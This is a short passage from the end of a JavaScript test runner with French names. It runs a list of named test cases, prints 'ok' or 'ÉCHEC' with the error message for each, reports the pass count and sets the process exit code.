 * ----------------------------------------------------------------------- */

let echecs = 0;
cas.forEach(([nom, fn]) => {
    try {
        fn();
        console.log(`  ok   ${nom}`);
    } catch (e) {
        echecs += 1;
        console.log(`  ÉCHEC ${nom}\n        ${e.message}`);
    }
});
console.log(`\n${cas.length - echecs}/${cas.length} cas réussis.`);
process.exit(echecs ? 1 : 0);
